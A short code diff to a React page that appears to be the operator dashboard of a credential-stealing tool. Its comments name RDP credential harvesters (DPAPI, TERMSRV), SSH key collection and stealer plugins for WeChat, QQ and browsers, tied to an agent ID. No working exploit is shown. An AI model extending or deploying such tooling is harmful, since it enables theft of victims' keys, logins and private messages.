@@ -15,7 +15,7 @@ export default function SoftwareDataPage() {
   const [tab, setTab] = useState<string>('ssh');
 
   // RDP harvesters are Windows-only (DPAPI, TERMSRV); SSH keys are cross-platform.
-  // WeChat/browser live in plugins (com.libra.wechat-file / com.libra.browser-stealer).
+  // WeChat/QQ live in plugins (com.libra.wechat-file / com.libra.qqkey).
   const isWindows = platform === 'windows';
   const tabs = [
     { id: 'ssh', label: t('othersoft.ssh.title'), render: <SSHTab agentId={agentId} /> },
